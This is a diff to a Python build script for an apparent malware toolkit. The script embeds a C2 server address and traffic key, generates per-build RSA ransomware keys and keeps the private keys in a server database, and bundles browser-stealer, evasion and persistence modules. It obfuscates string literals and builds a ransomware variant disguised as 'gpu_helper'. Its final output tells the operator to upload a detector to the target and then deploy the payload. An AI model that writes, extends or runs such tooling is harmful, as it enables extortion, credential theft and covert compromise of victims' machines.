@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import sys
 import json
@@ -6,11 +5,21 @@ import shutil
 import subprocess
 import tempfile
 import urllib.request
+import sqlite3
+from datetime import datetime
+from Crypto.PublicKey import RSA
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from tools.obfuscators.string_encrypt import obfuscate_tree
 
 PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 TRAFFIC_KEY_PATH = os.path.join(PROJECT_ROOT, "server", "data", "keys", "traffic_key.key")
 LIB_DIR = os.path.join(PROJECT_ROOT, "lib")
 FINAL_DIR = os.path.join(PROJECT_ROOT, "dist")
+DB_PATH = os.path.join(PROJECT_ROOT, "server", "data", "c2_data.db")
+
+BUILD_NUMBER = None
+PUBLIC_KEY_PEM = None
 
 print("=== Build Script ===")
 
@@ -35,10 +44,45 @@ print(f"[+] C2 Server: {c2_server}")
 print(f"[+] Traffic key: {traffic_key[:20]}...")
 os.makedirs(FINAL_DIR, exist_ok=True)
 
+
+def init_build_db():
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS build_keys (
+            build_number INTEGER PRIMARY KEY AUTOINCREMENT,
+            public_key TEXT NOT NULL,
+            private_key TEXT NOT NULL,
+            created_at TEXT NOT NULL
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+
+def register_build_key() -> int:
+    print("\n[*] Generating RSA-2048 key pair for this build...")
+    rsa_key = RSA.generate(2048)
+    pub_pem = rsa_key.public_key().export_key().decode()
+    priv_pem = rsa_key.export_key().decode()
+
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "INSERT INTO build_keys (public_key, private_key, created_at) VALUES (?, ?, ?)",
+        (pub_pem, priv_pem, datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+    )
+    conn.commit()
+    build_number = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
+    conn.close()
+
+    print(f"[+] Build #{build_number} registered in {DB_PATH}")
+    return build_number, pub_pem
+
+
 def build_variant(
     source_name, src_path, output_name, hidden_imports,
     exclude_modules, target_os, lib_paths=None
 ):
+    global BUILD_NUMBER, PUBLIC_KEY_PEM
     plat_suffix = "windows" if target_os == "Windows" else "linux"
     print(f"\n[*] Building {source_name} -> {output_name} ({target_os})...")
     build_dir = tempfile.mkdtemp(prefix=f"build_{output_name}_")
@@ -46,21 +90,24 @@ def build_variant(
     shutil.copy2(src_path, build_src)
 
     build_settings = os.path.join(build_dir, "settings.py")
-    shutil.copy2(
-        os.path.join(PROJECT_ROOT, "agents", "settings.py"),
-        build_settings,
-    )
+    with open(build_settings, 'w') as f:
+        f.write(f'C2_SERVER = "{c2_server}"\n')
+        f.write(f'TRAFFIC_KEY = b"{traffic_key}"\n')
+        f.write(f'BUILD_NUMBER = {BUILD_NUMBER}\n')
+        f.write(f'PUBLIC_KEY_PEM = """{PUBLIC_KEY_PEM}"""\n')
 
     lib_dest = os.path.join(build_dir, "lib")
     os.makedirs(lib_dest, exist_ok=True)
-    # Copy shared lib files (always included)
     for f in ['__init__.py', 'c2_client.py', 'crypto_utils.py', 'browser_stealer.py']:
         shutil.copy2(os.path.join(LIB_DIR, f), os.path.join(lib_dest, f))
-    # Copy platform-specific lib files under standard names
     for base_name in ['evasion', 'persistence']:
         plat_src = os.path.join(LIB_DIR, f"{base_name}_{plat_suffix}.py")
         if os.path.exists(plat_src):
             shutil.copy2(plat_src, os.path.join(lib_dest, f"{base_name}.py"))
+
+    print("[*] Obfuscating string literals...")
+    obfuscated = obfuscate_tree(build_dir)
+    print(f"    {obfuscated} files obfuscated")
 
     excludes = ["tkinter", "test", "unittest"]
     excludes.extend(exclude_modules)
@@ -168,11 +215,10 @@ def build_variant(
 
 
 def build_all_variants():
-    settings_path = os.path.join(PROJECT_ROOT, "agents", "settings.py")
-    with open(settings_path, 'w') as f:
-        f.write(f'C2_SERVER = "{c2_server}"\n')
-        f.write(f'TRAFFIC_KEY = b"{traffic_key}"\n')
-    print(f"[+] Wrote config to {settings_path}")
+    global BUILD_NUMBER, PUBLIC_KEY_PEM
+
+    init_build_db()
+    BUILD_NUMBER, PUBLIC_KEY_PEM = register_build_key()
 
     variants = [
         ("installer", "ransomware", "gpu_helper",
@@ -203,5 +249,6 @@ def build_all_variants():
 build_all_variants()
 
 print(f"\n[+] Build complete. Output in: {FINAL_DIR}")
+print(f"    Build #{BUILD_NUMBER} — private key stored in server DB.")
 print("    Upload hw_detect to your target first,")
 print("    then use Deploy from the dashboard to deliver gpu_helper.")
